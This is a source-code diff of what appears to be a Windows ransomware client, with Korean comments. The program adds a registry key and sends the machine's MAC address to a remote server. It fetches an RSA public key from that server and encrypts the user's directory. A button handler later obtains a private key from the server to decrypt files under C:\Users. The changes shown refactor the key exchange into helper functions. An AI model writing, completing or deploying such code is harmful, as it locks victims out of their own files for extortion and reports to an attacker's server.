@@ -26,9 +26,9 @@ HWND hEdit;
 #define IDC_MAIN_BUTTON	101			// Button identifier
 #define IDC_MAIN_EDIT	102			// Edit box identifier
 
-
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
 {
+
     // 레지스트리 키 등록
     SaveReg();
 
@@ -40,6 +40,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     WIN32_FIND_DATAA data;
     HANDLE hFind = FindFirstFileA((filename + "\\dirkey.key").c_str(), &data);
     if (hFind == INVALID_HANDLE_VALUE) {
+        // 암호화 되어 있지 않은 경우
         cout << "start";
 
         // 소켓 생성
@@ -48,35 +49,13 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
         // MAC 주소 전송
         string wifiMacAddress = getMacAddress();
         send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
-
-        // 처음 파일 실행인 경우
-        cout << "Start! \n";
         send(clientSocket, "start", sizeof("start"), 0);
 
         // 서버로부터 공개키 수신
-        unsigned char publicKeyBuf[294];
-        int publicKeyLen = recv(clientSocket, reinterpret_cast<char*>(publicKeyBuf), 294, 0);
-        if (publicKeyLen <= 0) {
-            std::cerr << "Failed to receive public key from server! Quitting" << std::endl;
-            closesocket(clientSocket);
-            WSACleanup();
-            return -4;
-        }
+        GetPubKeyFromServer(clientSocket);
+
         WSACleanup();
         closesocket(clientSocket);
-
-        HANDLE hFile = CreateFile(L"public_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) {
-            std::cerr << "Failed to create file." << std::endl;
-            return 0;
-        }
-        DWORD bytesWritten;
-        if (!WriteFile(hFile, publicKeyBuf, sizeof(publicKeyBuf), &bytesWritten, NULL)) {
-            std::cerr << "Failed to write to file." << std::endl;
-            CloseHandle(hFile);
-            return 0;
-        }
-        CloseHandle(hFile);
     
         RSA* pubKey = getPubKey();
         EncryptDir(pubKey, filename);
@@ -85,7 +64,6 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     FindClose(hFind);
 
     
-
 
     // win32 gui class
     //
@@ -147,7 +125,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
         DispatchMessage(&msg);
     }
 
-    return 0
+    return 0;
 }
 
 
@@ -231,11 +209,6 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
             //Definded in header
         case IDC_MAIN_BUTTON:
         { 
-            /*
-            RSA* priKey = getPriKey();
-            DecryptDir(priKey, filename);
-            RSA_free(priKey);
-            */
             
             //Waits for get message, reads the text and inputs into wchar buffer
             wchar_t* buffer[256];
@@ -248,39 +221,16 @@ LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 // 소켓 생성
                 SOCKET clientSocket = StartSocket();
 
-                // MAC 주소 가져오기
-                string wifiMacAddress = getMacAddress();
-
                 // 서버로 MAC 주소 전송
+                string wifiMacAddress = getMacAddress();
                 send(clientSocket, wifiMacAddress.c_str(), wifiMacAddress.size(), 0);
                 send(clientSocket, "end", sizeof("end"), 0);
 
                 // 서버로부터 공개키 수신
-                unsigned char privateKeyBuf[1192];
-                int privateKeyLen = recv(clientSocket, reinterpret_cast<char*>(privateKeyBuf), 1192, 0);
+                GetPriKeyFromServer(clientSocket);
 
-                if (privateKeyLen <= 0) {
-                    std::cerr << "Failed to receive public key from server! Quitting" << std::endl;
-                    closesocket(clientSocket);
-                    WSACleanup();
-                    return -4;
-                }
                 WSACleanup();
                 closesocket(clientSocket);
-
-                // 받아온 공개키 저장
-                HANDLE hFile = CreateFile(L"private_key.der", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-                if (hFile == INVALID_HANDLE_VALUE) {
-                    cerr << "Failed to create file." << endl;
-                    return 0;
-                }
-                DWORD bytesWritten;
-                if (!WriteFile(hFile, privateKeyBuf, sizeof(privateKeyBuf), &bytesWritten, NULL)) {
-                    cerr << "Failed to write to file." << endl;
-                    CloseHandle(hFile);
-                    return 0;
-                }
-                CloseHandle(hFile);
 
                 string filename = "C:\\Users";
                 string userName = getUserName();
